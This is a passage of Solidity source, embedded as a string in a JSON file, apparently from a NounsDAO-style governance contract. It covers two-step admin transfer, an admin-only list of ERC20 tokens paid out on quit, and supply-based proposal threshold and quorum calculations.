`_acceptAdmin` to finalize the transfer.\n     * @dev Admin function to begin change of admin. The newPendingAdmin must call `_acceptAdmin` to finalize the transfer.\n     * @param newPendingAdmin New pending admin.\n     */\n    function _setPendingAdmin(address newPendingAdmin) external {\n        // Check caller = admin\n        require(msg.sender == admin, 'NounsDAO::_setPendingAdmin: admin only');\n\n        // Save current value, if any, for inclusion in log\n        address oldPendingAdmin = pendingAdmin;\n\n        // Store pendingAdmin with value newPendingAdmin\n        pendingAdmin = newPendingAdmin;\n\n        // Emit NewPendingAdmin(oldPendingAdmin, newPendingAdmin)\n        emit NewPendingAdmin(oldPendingAdmin, newPendingAdmin);\n    }\n\n    /**\n     * @notice Accepts transfer of admin rights. msg.sender must be pendingAdmin\n     * @dev Admin function for pending admin to accept role and update admin\n     */\n    function _acceptAdmin() external {\n        // Check caller is pendingAdmin and pendingAdmin ≠ address(0)\n        require(msg.sender == pendingAdmin && msg.sender != address(0), 'NounsDAO::_acceptAdmin: pending admin only');\n\n        // Save current values for inclusion in log\n        address oldAdmin = admin;\n        address oldPendingAdmin = pendingAdmin;\n\n        // Store admin with value pendingAdmin\n        admin = pendingAdmin;\n\n        // Clear the pending value\n        pendingAdmin = address(0);\n\n        emit NewAdmin(oldAdmin, admin);\n        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);\n    }\n\n    /**\n     * @notice Admin function for setting the list of ERC20 tokens to transfer on `quit`.\n     */\n    function _setErc20TokensToIncludeInQuit(address[] calldata erc20tokens) external {\n        if (msg.sender != admin) revert AdminOnly();\n        checkForDuplicates(erc20tokens);\n\n        emit ERC20TokensToIncludeInQuitSet(erc20TokensToIncludeInQuit, erc20tokens);\n\n        erc20TokensToIncludeInQuit = erc20tokens;\n    }\n\n    /**\n     * @notice Current proposal threshold using Noun Total Supply\n     * Differs from `GovernerBravo` which uses fixed amount\n     */\n    function proposalThreshold() public view returns (uint256) {\n        return bps2Uint(proposalThresholdBPS, adjustedTotalSupply());\n    }\n\n    /**\n     * @notice Current quorum votes using Noun Total Supply\n     * Differs from `GovernerBravo` which uses fixed amount\n     */\n    function quorumVotes() public view returns (uint256) {\n        return bps2Uint(quorumVotesBPS, adjustedTotalSupply());\n    }\n\n    function adjustedTotalSupply() public view returns (uint256) {\n        return nouns.totalSupply() - nouns.balanceOf(address(timelock)) + nouns.remainingTokensToClaim();\n    }\n\n    function erc20TokensToIncludeInQuitArray() public view returns(address[] memory) {\n        return erc20TokensToIncludeInQuit;\n    }\n\n    function bps2Uint(uint256 bps, uint256 number) internal pure returns (uint256) {\n        return (number * bps) / 10000;\n    }\n\n    function _authorizeUpgrade(address) internal"
    }
  ]
}